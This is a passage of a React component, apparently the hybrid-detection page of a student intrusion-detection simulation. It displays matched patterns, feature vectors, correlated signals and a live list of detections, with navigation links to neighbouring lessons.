                                  <span key={i} className="px-2 py-0.5 rounded bg-teal-50 text-teal-700 border border-teal-100 text-[10px]" title={p.pattern || p.name}>{p.feature_type || p.type || 'feat'}:{(p.pattern || p.pattern_regex || '').slice(0,18)}</span>
                                ))}
                                {lastDetection.details.matchedPatterns.length > 12 && <span className="text-[10px] text-gray-500">+{lastDetection.details.matchedPatterns.length-12} more</span>}
                              </div>
                            </div>
                          )}
                          {lastDetection.details?.features && lastDetection.details.features.length > 0 && (
                            <div>
                              <h5 className="font-semibold text-gray-600 text-[10px] mb-1">Feature Vector ({lastDetection.details.features.length})</h5>
                              <div className="grid grid-cols-4 md:grid-cols-7 gap-1">
                                {lastDetection.details.features.map((f,i)=>(
                                  <div key={i} className="bg-gray-100 rounded px-1 py-0.5 text-[10px] text-gray-700 font-mono" title={`f${i}`}>{typeof f === 'number' ? f.toFixed(2) : f}</div>
                                ))}
                              </div>
                            </div>
                          )}
                          {lastDetection.details?.fusionRule && (
                            <div className="text-[10px] bg-yellow-50 border border-yellow-100 rounded p-2 text-yellow-800">
                              Fusion Rule: {lastDetection.details.fusionRule}
                            </div>
                          )}
                          {lastDetection.details?.explanation && (
                            <div className="text-[10px] bg-blue-50 border border-blue-100 rounded p-2 text-blue-800">
                              {lastDetection.details.explanation}
                            </div>
                          )}
                          {lastDetection.correlated && lastDetection.correlated.length>0 && (
                            <div className="mt-1">
                              <h5 className="font-semibold text-gray-600 text-[10px] mb-1">Correlated Signals</h5>
                              <div className="flex flex-wrap gap-1">
                                {lastDetection.correlated.map((c,i)=>{
                                  const src = c.type?.toLowerCase().includes('signature') ? 'signature' : c.type?.toLowerCase().includes('anomaly') ? 'anomaly' : 'other';
                                  const badgeCls = src==='signature' ? 'bg-blue-100 text-blue-700 border-blue-200' : src==='anomaly' ? 'bg-red-100 text-red-700 border-red-200' : 'bg-purple-100 text-purple-700 border-purple-200';
                                  return (
                                    <span key={i} className={`text-[10px] px-2 py-0.5 rounded border ${badgeCls}`}>{src.slice(0,3).toUpperCase()}: {(c.pattern || c.description || c.type || '').slice(0,16)}</span>
                                  );
                                })}
                              </div>
                            </div>
                          )}
                        </div>
                      ) : (
                        <div className="text-xs text-gray-500 italic">No detection selected</div>
                      )}
                    </div>
                  )}
                </div>

                {/* Right: Live Panel */}
                <div className="xl:col-span-1 space-y-6">
                  {showLivePanel && (
                    <div className="bg-white border border-gray-200 rounded-lg p-4 shadow-sm">
                      <div className="flex items-center mb-3">
                        <div className={`w-3 h-3 rounded-full mr-2 ${paused ? 'bg-gray-400' : 'bg-indigo-500 animate-pulse'}`}></div>
                        <h3 className="font-semibold text-gray-800 text-sm tracking-wide uppercase">Live Hybrid Detections</h3>
                        <button onClick={() => setShowLivePanel(false)} className="ml-auto text-xs text-gray-400 hover:text-gray-600">Hide</button>
                      </div>
                      {detectionResults.length === 0 ? (
                        <div className="text-gray-500 text-center py-4 italic text-sm">No detections yet</div>
                      ) : (
                        <div className="space-y-3">
                          {liveSlice.map(det => (
                            <div
                              key={det._id}
                              className={`bg-white border border-indigo-200 rounded-lg p-3 shadow-sm hover:shadow-md transition-all duration-150 cursor-pointer ${selectedDetection && selectedDetection._id===det._id ? 'ring-2 ring-indigo-300' : ''}`}
                              onClick={() => setSelectedDetection(det)}
                            >
                              <div className="flex flex-col">
                                <div className="flex items-center gap-2 mb-1 min-w-0">
                                  <span className={`text-[10px] font-semibold px-2 py-0.5 rounded ${severityBadge(det.severity)}`}>{det.severity}</span>
                                  <span className="font-semibold text-gray-800 text-xs truncate" title={det.type}>{det.type}</span>
                                  <span className="ml-auto text-[9px] text-gray-400 whitespace-nowrap order-last">{det.timestamp}</span>
                                </div>
                                <div className="text-[11px] text-gray-600 truncate" title={det.description}>{det.description}</div>
                                <div className="text-[11px] text-gray-600 truncate">cmd: <code className="bg-yellow-100 px-1 rounded" title={det.command}>{det.command}</code></div>
                                <div className="flex flex-wrap gap-x-3 gap-y-1 mt-1">
                                  {det.details && det.details.correlationStrength && (
                                    <div className="text-[10px] text-purple-600">Corr: {det.details.correlationStrength}</div>
                                  )}
                                  {det.confidence !== undefined && (
                                    <div className="text-[10px] text-gray-500">conf {(det.confidence*100).toFixed(1)}%</div>
                                  )}
                                </div>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}

          <div className="flex justify-between mt-8">
            <Link 
              to="/simulation/anomaly"
              className="px-6 py-2 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 transition-colors"
            >
              Previous: Anomaly-Based Detection
            </Link>
            <Link 
              to="/student/lobby"
              className="px-6 py-2 bg-[#1E5780] text-white rounded-lg hover:bg-[#164666] transition-colors"
            >
              Next: Simulation Lobby
            </Link>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Hybrid;